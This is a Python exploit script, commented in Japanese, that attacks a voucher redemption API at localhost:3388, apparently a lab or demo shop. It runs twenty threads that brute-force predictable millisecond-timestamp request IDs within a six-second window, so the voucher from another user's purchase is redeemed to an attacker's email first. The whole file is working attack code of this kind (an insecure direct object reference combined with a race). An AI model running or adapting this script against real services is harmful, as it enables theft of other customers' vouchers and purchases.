
import requests
import time
import threading
import sys

# --- 設定 ---
TARGET_URL = "http://localhost:3388/api/redeem"
ATTACKER_EMAIL = "attacker@example.com"
NUM_THREADS = 20  # 同時実行スレッド数を増やして攻撃の成功率を上げる
OFFSET_MS_MIN = 100  # 100ミリ秒未来から予測を開始
OFFSET_MS_MAX = 6000 # ユーザーの5秒間の遅延＋ネットワーク遅延を考慮し、6秒未来まで予測
OFFSET_STEP_MS = 20  # より細かいステップでタイムスタンプを試行

# --- スレッド間で共有する状態 ---
success_event = threading.Event()  # 攻撃成功を全スレッドに通知するためのフラグ

def print_status(char):
    """改行なしで一文字を出力し、コンソールを即時更新する"""
    sys.stdout.write(char)
    sys.stdout.flush()

def exploit_worker(session):
    """
    攻撃を実行するワーカースレッド。
    成功フラグが立つまで、未来のタイムスタンプを推測してリクエストを送信し続ける。
    """
    while not success_event.is_set():
        current_time_ms = int(time.time() * 1000)
        
        for offset in range(OFFSET_MS_MIN, OFFSET_MS_MAX, OFFSET_STEP_MS):
            # ループの各ステップで成功フラグをチェックし、即座に停止できるようにする
            if success_event.is_set():
                return

            guessed_timestamp = str(current_time_ms + offset)
            
            try:
                response = session.post(
                    TARGET_URL,
                    json={"requestID": guessed_timestamp, "email": ATTACKER_EMAIL},
                    timeout=0.5  # タイムアウトを適切に設定
                )
                
                if response.status_code == 200:
                    # --- 攻撃成功 ---
                    success_event.set()  # 他の全スレッドに停止を通知
                    print("\n\n" + "="*60)
                    print(f"[+] SUCCESS! Voucher stolen for Request ID: {guessed_timestamp}")
                    print(f"[+] Voucher sent to: {ATTACKER_EMAIL}")
                    print(f"[+] Server response: {response.json()}")
                    print("="*60 + "\n")
                    return

            except requests.exceptions.RequestException:
                # サーバーがまだ準備できていない、タイムアウト、接続エラーなどは無視
                pass
        
        # CPU使用率が100%になるのを防ぐための短いスリープ
        time.sleep(0.01)

if __name__ == "__main__":
    print("="*60)
    print("Time-based IDOR Exploit Script")
    print(f"Target: {TARGET_URL}")
    print(f"Attacker Email: {ATTACKER_EMAIL}")
    print(f"Threads: {NUM_THREADS}")
    print("="*60)
    
    # 必要なライブラリがインストールされているか確認
    try:
        import requests
    except ImportError:
        print("\n[!] 'requests' library not found.")
        print("Please install it using: pip install requests")
        sys.exit(1)

    print("\nStarting attack...")
    print("Now, go to http://localhost:3388 in your browser, add to cart, and confirm purchase.")
    print("The script will attempt to redeem the voucher before the legitimate user.")
    print("Attack running, waiting for a purchase...", end="")

    threads = []
    # 単一のセッションを全スレッドで共有し、TCPコネクションを再利用する
    with requests.Session() as session:
        # ワーカースレッドを起動
        for i in range(NUM_THREADS):
            thread = threading.Thread(target=exploit_worker, args=(session,))
            threads.append(thread)
            thread.start()
            
        # 攻撃が成功するか、Ctrl+Cが押されるまで待機
        try:
            while not success_event.is_set():
                # 1秒ごとに進捗ドットを出力
                time.sleep(1)
                print_status('.')
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user.")
            success_event.set()  # 全スレッドに停止を通知
        
        # すべてのスレッドが終了するのを待つ
        for thread in threads:
            thread.join()
    
    print("\nExploit script finished.")
